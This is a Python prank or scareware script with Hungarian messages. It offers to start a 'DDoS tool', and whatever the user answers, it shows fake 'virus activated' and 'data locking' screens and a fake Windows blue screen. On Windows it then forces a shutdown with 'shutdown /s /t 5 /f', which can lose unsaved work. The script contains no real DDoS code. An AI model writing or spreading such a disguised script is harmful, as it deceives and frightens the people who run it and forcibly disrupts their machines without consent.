import time
import sys
import os
import random
from colorama import init, Fore, Style

# Colorama inicializálása
init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ASCII art
PIXEL_ART = r"""
  (                                 _
   )                               /=>
  (  +____________________/\/\___ / /|
   .''._____________'._____      / /|/\
  : () :              :\ ----\|    \ )
   '..'______________.'0|----|      \
                    0_0/____/        \
                        |----    /----\
                       || -\\ --|      \
                       ||   || ||\      \
                        \\____// '|      \
                                .'/       |
                               .:/        |
                               :/_________|
"""

# Branding
BRANDING = r"""
    ███╗   ███╗ █████╗ ██████╗ ██╗██╗  ██╗██╗  ██╗
    ████╗ ████║██╔══██╗██╔══██╗██║██║ ██╔╝╚██╗██╔╝
    ██╔████╔██║███████║██████╔╝██║█████╔╝  ╚███╔╝ 
    ██║╚██╔╝██║██╔══██║██╔═══╝ ██║██╔═██╗  ██╔██╗ 
    ██║ ╚═╝ ██║██║  ██║██║     ██║██║  ██╗██╔╝ ██╗
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
               ~ by Marki2Fly ~
"""

def chaotic_screen():
    chars = ['#','%','&','@','*','!','$','?','>','<']
    width = 120
    height = 30

    messages = [
        "!!! VÍRUS AKTIVÁLVA !!!",
        "!!! ADATOK ZÁROLÁSA !!!",
    ]

    current_msg = random.choice(messages)
    last_change = time.time()

    for _ in range(40):
        clear_screen()
        for _ in range(height):
            line = ''.join(random.choice(chars) for _ in range(width))
            style = random.choice([Style.DIM, Style.BRIGHT])
            print(Fore.RED + style + line)

        if time.time() - last_change >= 2:
            current_msg = random.choice(messages)
            last_change = time.time()

        print(Fore.RED + Style.BRIGHT + current_msg.center(width))
        time.sleep(0.1)

def dramatic_countdown(seconds=12):
    warnings = ["Vírus minden fájlban aktív!"]
    for i in range(seconds, 0, -1):
        msg = random.choice(warnings)
        print(Fore.RED + Style.BRIGHT + f"\r{msg} Bezárul {i} mp múlva... ", end='', flush=True)
        time.sleep(1)
    print(Fore.RED + "\r!!! RENDSZER LEÁLLÍTVA !!!          ")

def fake_bsod():
    clear_screen()
    print(Fore.BLUE + Style.BRIGHT + "\n")
    print(":(\n")
    print("A számítógép hibába ütközött, és újra kell indítani.\n")
    print("Csak információkat gyűjtünk a hibáról, majd újraindítjuk.\n")

    percent = 0
    while percent <= 100:
        print(Fore.BLUE + Style.BRIGHT + f"\r{percent}% kész", end="", flush=True)
        time.sleep(0.05)
        percent += random.randint(1, 10)

    print("\n\nTovábbi információk:")
    print("STOP CODE: CRITICAL_PROCESS_DIED")
    print("WHAT FAILED: system32\\drivers\\virus.sys")
    time.sleep(4)

def main():
    clear_screen()
    print(Fore.RED + Style.BRIGHT + BRANDING)
    print("\n")

    print(Fore.RED + Style.BRIGHT + "+" + "-"*38 + "+")
    print(Fore.RED + Style.BRIGHT + "|     Start the DDoS tool?     |")
    print(Fore.RED + Style.BRIGHT + "+" + "-"*38 + "+\n")

    print(Fore.RED + "1 - yes")
    print(Fore.RED + "2 - no")

    valasztas = input(Fore.RED + "choose (1 or 2): ").strip()
    clear_screen()

    if valasztas not in ["1", "2"]:
        print(Fore.RED + "HIBA! Érvénytelen választás!")
        time.sleep(2)
        return

    chaotic_screen()

    print(Fore.RED + Style.BRIGHT + "a vírus lefutott...")
    print(Fore.RED + PIXEL_ART)

    dramatic_countdown(12)
    fake_bsod()

    # ────────────────────────────────────────────────
    #           LEÁLLÍTÁS – AZONNAL indul
    # ────────────────────────────────────────────────
    clear_screen()
    print(Fore.RED + Style.BRIGHT + "\n" * 5)
    print(" " * 20 + "R E N D S Z E R   L E Á L L Í T Á S")
    print("\n" * 3)
    print(" " * 15 + "A folyamat elindult...")

    if os.name == 'nt':  # Windows
        os.system('shutdown /s /t 5 /f /c "a gépednek gatya, leállítás..."')
    else:
        # Linux/macOS – sudo kell, ezért csak üzenet
        print(Fore.YELLOW + "Leállítási parancs nem futtatható automatikusan (sudo szükséges)")

    # Nincs input, nincs extra várakozás → bezárul, miután elindult a shutdown

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # Ha mégis Ctrl+C-vel szakítják meg
        print(Fore.GREEN + "\nMegszakítva.")
    except Exception as e:
        print(Fore.RED + f"Hiba: {e}")